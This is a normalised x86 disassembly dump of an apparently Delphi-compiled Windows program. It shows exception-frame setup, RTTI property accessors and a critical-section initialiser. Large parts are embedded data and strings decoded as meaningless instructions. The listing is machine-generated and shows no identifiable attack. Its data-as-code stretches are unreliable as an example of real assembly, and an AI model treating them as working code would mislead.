mov [ rw-data ] eax
mov eax sub_40e670
mov [ rw-data ] eax
mov edx sub_40e580
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax sub_40edcc
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_41341c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40f0e0
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_4120a8
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_4127d0
mov edx [ rw-data ]
mov [ edx ] eax
push rw-data
call InitializeCriticalSection
sub_413cc8
push 0xab004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ edi + edi * 8 - 0x79980000 ] ch
inc edi
add [ ebp + 0x680000ff ] ch
xchg [ edi ] al
scasb [ edi ]
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ edi + 0x680000ff ] ch
xchg [ edi ] al
nop
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ecx + 0x680000ff ] dl
xchg [ edi ] al
xchg edx eax
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ebx + 0x680000ff ] dl
xchg [ edi ] al
xchg esp eax
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ebp + 0x680000ff ] dl
xchg [ edi ] al
xchg esi eax
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ edi + 0x680000ff ] dl
xchg [ edi ] al
cwde
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ecx + 0x680000ff ] bl
xchg [ edi ] al
0x680000ff 0x4786
add [ ebx + 0x680000ff ] bl
xchg [ edi ] al
pushfd
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ebp + 0x680000ff ] bl
xchg [ edi ] al
sahf
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ edi + 0x680000ff ] bl
xchg [ edi ] al
cmp bh 0x0
add [ eax - 0x7a ] ch
inc edi
add [ ecx + 0x680000ff ] al
xchg [ edi ] al
cmp bh 0x0
add [ eax - 0x7a ] ch
inc edi
add [ ebx + 0x680000ff ] al
xchg [ edi ] al
test bh bh
add [ eax ] al
push 0x85004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ esi + 0x680000ff ] al
xchg [ edi ] al
xchg edi edi
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_413dd5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413ddc
retn
sub_413e20
push ebx
push esi
push edi
test edx edx
je r-xdata
or eax 0xffffffff
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ eax + ecx + 0xb ]
mov eax [ eax ]
mov cl [ eax + 0x1 ]
lea esi [ eax + ecx + 0xf ]
mov edi [ eax + ecx + 0x7 ]
xor eax eax
inc eax
lea esi [ ecx + esi + 0x1 ]
cmp eax edi
jle r-xdata
mov bl [ ecx + edx - 0x1 ]
xor bl [ ecx + esi ]
test bl 0xdf
jne r-xdata
mov cl [ esi ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
mov cl [ esi ]
dec ecx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_413e6c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x1
jne r-xdata
mov eax ebx
call sub_413e14
cmp [ eax + 0x1 ] 0x0
jge r-xdata
mov eax esi
call sub_408310
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_413e20
mov edx [ rw-data ]
mov eax esi
call sub_407fd4
test al al
je r-xdata
mov edx [ rw-data ]
mov eax esi
call sub_407fd4
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_408310
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
retn
sub_413ed0
push ebx
push esi
push edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx edx
or edx edx
je r-xdata
xor ebx ebx
mov bl [ eax + 0x1 ]
lea esi [ eax + ebx + 0x2 ]
mov bl [ esi + 0xa ]
movzx edi [ esi + ebx + 0xb ]
test edi edi
je r-xdata
mov cl [ edx - 0x4 ]
mov ch [ edx ]
and ecx 0xdfff
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + ebx + 0xd ]
mov eax [ eax ]
jmp r-xdata
mov bh 0x0
mov bh 0x0
dec edi
lea eax [ eax + ebx + 0x1b ]
jne r-xdata
mov ch [ edx ]
and ch 0xdf
mov bl [ eax + 0x1a ]
jmp r-xdata
dec ebx
jne r-xdata
mov bx [ eax + 0x1a ]
and bh 0xdf
cmp ebx ecx
je r-xdata
mov ch [ ebx + edx - 0x1 ]
xor ch [ eax + ebx + 0x1a ]
test ch 0xdf
jne r-xdata
sub_413f40
push ebx
push edi
mov edi [ edx ]
mov edi [ edi ]
mov bl 0x4
cmp [ edi ] 0x7
je r-xdata
mov ecx [ edx + 0x4 ]
cmp [ edx + 0x7 ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
mov bl [ edi + ecx + 0x2 ]
call ecx
jmp r-xdata
ja r-xdata
cmp bl 0x4
jae r-xdata
and ecx 0xffffff
add ecx eax
mov al [ ecx ]
cmp bl 0x2
jb r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop edi
pop ebx
retn
cmp bl 0x2
jae r-xdata
mov ax [ ecx ]
cmp bl 0x4
jb r-xdata
movsx eax ax
je r-xdata
cmp bl 0x0
movsx eax al
je r-xdata
mov eax [ ecx ]
and eax 0xffff
and eax 0xff
pop edi
pop ebx
retn
sub_413fb4
push ebx
push esi
push edi
mov edi edx
mov esi [ edi ]
mov esi [ esi ]
mov bl 0x4
cmp [ esi ] 0x7
je r-xdata
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
xor ebx ebx
mov bl [ esi + 0x1 ]
mov bl [ esi + ebx + 0x2 ]
mov esi [ edi + 0x8 ]
cmp [ edi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add eax esi
mov [ eax ] cl
cmp bl 0x2
jb r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax ] cx
cmp bl 0x4
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
mov [ eax ] ecx
sub_414010
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add edi eax
mov eax [ esi ]
mov eax [ eax ]
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
mov cl [ eax + ecx + 0x2 ]
lodsb [ esi ]
cmp al cl
jb r-xdata
jb r-xdata
stosb [ edi ]
mov cl al
[ edi ] [ esi ]
pop edi
pop esi
retn
mov al cl
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_414064
push ebx
push esi
push edi
add esp 0xffffff00
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov edx edi
mov ecx 0xff
call sub_4042d4
mov ecx esp
mov edx esi
mov eax ebx
call sub_414010
add esp 0x100
pop edi
pop esi
pop ebx
retn
sub_4140ac
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_414098
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_4140ec
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_414134
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_404864
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_414170
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41413b
lea eax [ ebp - 0x4 ]
call sub_404718
retn
sub_414144
push ebx
mov ebx [ edx ]
mov ebx [ ebx ]
mov bl [ ebx ]
sub bl 0x5
je r-xdata
call sub_414064
pop ebx
retn
sub bl 0x5
je r-xdata
call sub_4140ac
pop ebx
retn
dec bl
je r-xdata
call sub_4140ec
jmp r-xdata
pop ebx
retn
sub_414170
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_414236
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0xc ]
mov edx edi
call sub_4042c0
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_414144
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41423d
lea eax [ ebp - 0xc ]
call sub_404038
retn
dec al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax ebx
mov edx edi
call sub_404754
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_414244
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx [ esi + 0x8 ]
mov eax [ esi ]
mov eax [ eax ]
call sub_413e14
mov al [ eax ]
mov edx ebx
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
cmp edx 0xfe000000
jne r-xdata
mov edx ebx
and edx 0xffffff
add edx edi
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x8 ] ebx
mov edx [ edi ]
movsx ecx bx
add edx ecx
mov edx [ edx ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
jmp [ eax * 4 + jump_table_41428c ]
and eax 0x7f
cmp eax 0x4
ja r-xdata
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x4 ] edi
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x8 ] ax
jmp r-xdata
fld [ ebp + 0x8 ]
fistp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
fistp [ edx ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_4143bb ]
jmp [ eax * 4 + jump_table_414328 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
sub_414450
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_41443c
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_414490
push ebx
mov ebx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ebx 0xffffff
add eax ebx
mov edx [ ecx ]
mov ebx [ ecx + 0x4 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
pop ebx
retn
mov edx [ edx + 0x10 ]
push [ ecx + 0x4 ]
push [ ecx ]
jb r-xdata
call ebx
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop ebx
retn
sub_4144c8
push ebp
mov ebp esp
cmp [ edx + 0xb ] 0xfe
mov ecx [ edx + 0x8 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov edx [ edx + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ebp
retn 0x8
sub_414504
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ecx [ edx + 0x8 ]
mov ebx ecx
and ebx 0xff000000
cmp ebx 0xff000000
jne r-xdata
cmp ebx 0xfe000000
jne r-xdata
mov ebx ecx
and ebx 0xffffff
add ebx eax
mov eax ebx
mov edx esi
call sub_405940
jmp r-xdata
mov [ esp ] ecx
mov ebx [ eax ]
movsx ecx cx
add ebx ecx
mov ecx [ ebx ]
mov [ esp ] ecx
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov ecx esi
mov edx eax
mov eax [ esp + 0x4 ]
call [ esp ]
mov edx esi
mov eax [ esp + 0x4 ]
call [ esp ]
jmp r-xdata
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_414578
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4145be
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4145c5
retn
mov eax rw-data
call sub_404038
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404ac0
sub_4145d4
push cs
or esi [ ecx + 0x67 ]
dec ebp
push ebp
dec esp
push esp
dec ecx
pop edi
push ecx
dec ecx
or al 0x0
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] eax
add al 0x0
add [ eax ] al
lea eax [ eax ]
clc
inc ebp
inc ecx
add [ edi ] cl
or [ ecx + 0x50 ] cl
jb r-xdata
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
pop es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
pop eax
imul esi [ ebx + 0x74 ] r-xdata
add [ ecx + eax ] ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
pop es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
pop eax
add [ eax ] eax
sub_414691
or cl [ ecx + 0x4c ]
outsd
arpl [ ebx + 0x42 ] bp
jns r-xdata
imul esi [ esi + 0x65 ] 0xff000558
dec [ ebx + 0x41471cc0 ]
jae r-xdata
je r-xdata
adc [ eax ] eax
add [ edx ] ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
pop eax
je r-xdata
arpl [ esp + edx * 4 + 0x11 ] si
inc eax
add [ ecx ] al
adc al [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
pop es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
pop eax
adc eax 0x8dffff00
inc eax
add [ edi + eax * 2 + 0xa0f0041 ] al
dec ecx
dec edi
insb
push edi
imul ebp [ esi + 0x64 ] 0x1194776f
inc eax
add [ ecx ] al
adc al 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
pop es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
pop eax
add al [ eax ]
push 0x65
jae r-xdata
add [ eax ] al
add [ eax ] al
inc esi
pop es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
pop eax
pop es
add bh bh
dec [ ebp + 0x46c40040 ]
inc ecx
add [ esi ] cl
or esi [ ecx + 0x67 ]
push ebx
push esp
inc ecx
push esp
inc esp
inc ecx
push esp
inc ecx
and [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
in al 0x46
inc ecx
add [ eax ] bl
add [ eax ] al
add [ ebp + 0x46e80040 ] cl
inc ecx
add [ edi ] cl
or ecx [ ecx + 0x41 ]
jbe r-xdata
add [ eax ] al
rol [ eax ] 0x0
popad
insd
hlt
bound ebp [ edx + 0x65 ]
dec edi
add [ esi ] cl
or al 0x74
popad
inc ebp
pop eax
inc ebx
inc ebp
push eax
dec ecx
dec esi
inc esi
dec edi
and [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
[ eax ] al
add al 0x0
add [ eax ] al
[ eax ] al
or [ eax ] al
add [ eax ] al
[ eax ] al
or al 0x0
add [ eax ] al
mov eax eax
push eax
inc edi
inc ecx
add [ edi ] cl
or cl [ ecx + 0x4f ]
insb
dec edi
push ebx
imul ebp [ esi + 0x6b ] r-xdata
add [ edi ] ecx
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
pop es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
pop eax
add eax 0x8bffff00
rcr [ edi + eax * 2 ] 0x41
sub_414a90
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_414ab5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414abc
retn
sub_414ac9
dec edx
inc ecx
add [ ebx ] al
or dl [ ecx + eax * 2 + 0x6c ]
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add al cl
dec edx
inc ecx
add [ 0x654c6174 ] cl
je r-xdata
jae r-xdata
jne r-xdata
retn
inc eax
add [ eax + 0x4b ] al
inc ecx
add [ ebx ] al
or [ edx + eax * 2 + 0x69 ] edx
inc esp
imul ecx [ ebp + 0x6f ] 0x16564
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ebx + ecx * 2 ] bh
inc ecx
imul esp [ edi + 0x68 ] 0x64620d74
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ esi ] al
outsd
push edx
sbb [ edx + 0x64 ] ah
push edx
bound esp [ edx + edx * 2 + 0x69 ]
push 0x4c6f5474
je r-xdata
dec esp
je r-xdata
jns r-xdata
sbb al 0x4c
inc ecx
push 0x5746669
jae r-xdata
insb
or [ gs : ebx + 0x73 ] dh
popad
imul ebp [ fs : esi + 0x67 ] 0x796c6e4f
pop es
jae r-xdata
imul esp [ edi + 0x68 ] 0x4c6f5474
outsd
or [ ecx + 0x43 ] dh
je r-xdata
popad
jae r-xdata
outsd
outsb
je r-xdata
push esp
jns r-xdata
inc ecx
insb
je r-xdata
outsd
insb
pop es
inc ebx
insb
popad
jae r-xdata
add [ ecx ] al
or al 0x54
dec eax
insb
jo r-xdata
jae r-xdata
mov eax eax
je r-xdata
je r-xdata
outsd
dec esp
jb r-xdata
add [ 0x654c6462 ] cl
je r-xdata
push edx
imul esp [ edi + 0x68 ] 0x73754a74
je r-xdata
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
jae r-xdata
je r-xdata
js r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ gs : eax ] eax
push es
jae r-xdata
jae r-xdata
dec esp
inc ecx
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax + 0x74 ] ebp
inc ebx
outsd
outsb
add [ ecx ] ecx
push esp
push ebx
push 0x4374726f
jae r-xdata
jae r-xdata
add [ eax ] al
add [ ebx + ecx * 2 + 0x73070041 ] ch
jae r-xdata
shl [ eax + 0x300414b ] 0x2
xor [ cs : ecx ] eax
add [ ecx ] al
add [ eax ] al
add [ esp + ecx * 2 ] dh
insb
nop
inc ebx
insb
popad
jae r-xdata
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc00414d ] bh
add [ eax ] al
add [ ecx * 2 + 0x35300041 ] cl
inc eax
add [ esi + 0x35400040 ] bh
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ 0x72434645 ] cl
popad
je r-xdata
outsd
jb r-xdata
dec esp
inc ecx
add [ ecx ] al
or [ ebx + edx * 2 + 0x68 ] edx
outsd
jb r-xdata
inc eax
add [ eax * 2 + 0x65727453 ] cl
popad
fdiv [ edx ]
jns r-xdata
jb r-xdata
add al 0x1
add [ eax ] al
cmp bh 0xff
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4d ] bl
inc ecx
add [ eax + eax ] cl
add [ eax ] al
mov al 0x4c
inc ecx
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ eax ] dl
inc ebp
inc esi
add [ eax ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
jb r-xdata
inc ecx
add [ ecx ] cl
push 0x79654b74
ja r-xdata
xor al 0x4c
dec esp
je r-xdata
add [ eax ] al
inc ebx
js r-xdata
add [ eax - 0x63ffbfce ] al
xor al [ eax ]
add eax [ eax ]
add [ eax ] al
add bh bh
inc [ eax ]
add [ eax + 0x800414c ] cl
or al 0x54
dec esi
outsd
je r-xdata
add al 0x4c
inc ecx
add [ esi ] al
or edx [ ebx + edx * 2 + 0x68 ]
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ebx + ecx * 2 - 0x3f74ffbf ] ebp
dec edi
outsb
insb
jns r-xdata
jae r-xdata
je r-xdata
imul esp [ edi + 0x68 ] 0x174
add [ eax ] al
add [ eax ] eax
add [ eax ] al
enter 0x414a 0x0
pop es
inc ebx
insb
popad
jae r-xdata
inc ecx
insb
imul esp [ edi + 0x6e ] 0x52646218
jae r-xdata
pop es
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] ecx
push es
push ebx
outsb
jb r-xdata
inc eax
add [ eax + 0x4d ] bl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ edx + esi + 0x32d80040 ] bl
cmp [ 0x32800040 ] dh
jne r-xdata
inc ebx
add [ eax + 0x72 ] bl
inc eax
jbe r-xdata
add [ ecx + edx + 0x40 ] dh
add [ ebp + 0x4cfc0040 ] cl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x74 ] si
adc [ eax ] eax
lea eax [ eax ]
cld
dec esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ecx * 2 ] dl
inc ecx
add [ eax + eax ] cl
add [ eax ] al
or al 0x4d
inc ecx
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ ebx ] cl
inc ebp
inc esi
dec edi
jo r-xdata
outsd
jb r-xdata
inc esp
outsd
jne r-xdata
or [ ebx + 0x73 ] dh
jae r-xdata
pop eax
jb r-xdata
pop es
inc ebx
insb
jae r-xdata
je r-xdata
outsd
dec esp
add [ eax ] al
add [ eax ] al
push es
mov eax eax
mov al 0x4b
inc ecx
add [ ebx ] al
add ch [ esi ]
xor [ ecx ] eax
inc ebx
insb
popad
jae r-xdata
mov [ edi ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414abc
retn
sbb [ ebx + 0x41 ] cl
add [ ebx ] al
or dl [ esp + ecx * 2 + 0x65 ]
je r-xdata
or eax 0x69526462
push 0x4c6f5474
outsb
je r-xdata
inc ebx
add [ eax + eax ] cl
add [ eax ] al
mov al 0x4c
inc ecx
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ eax ] al
add [ esi + ecx * 2 + 0x41 ] ch
dec esi
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
dec esi
inc ecx
outsd
jb r-xdata
xor al [ eax ]
or al 0x45
push ebx
je r-xdata
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
inc ebp
jb r-xdata
add al bl
inc eax
add [ eax + 0x414d ] bh
add [ eax ] al
dec ebx
jns r-xdata
dec ebp
imul esp [ esp + 0x6c ] 0x73730865
push edx
imul esp [ edi + 0x68 ] 0x73730874
je r-xdata
push 0x6e6f4374
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ecx * 2 + 0x41 ] dh
add [ eax + eax ] cl
add [ eax ] al
and [ esi + 0x41 ] cl
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ esi ] cl
inc ebp
inc ebx
insb
popad
jae r-xdata
outsd
jb r-xdata
imul ebp [ ebp + 0x53 ] 0x61657274
insd
inc ebp
jb r-xdata
inc eax
add al bl
xor al [ eax ]
adc [ ebp + 0x46 ] al
rcl [ esi + ecx * 2 ] 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
inc ebp
jb r-xdata
popad
add [ eax + eax ] cl
add [ eax ] al
and [ esi + 0x41 ] cl
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ edx ] cl
inc ebp
push edx
popad
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les ecx [ esi + 0x41 ]
outsd
jb r-xdata
add [ eax ] al
cld
add [ eax ] al
dec esi
outsd
je r-xdata
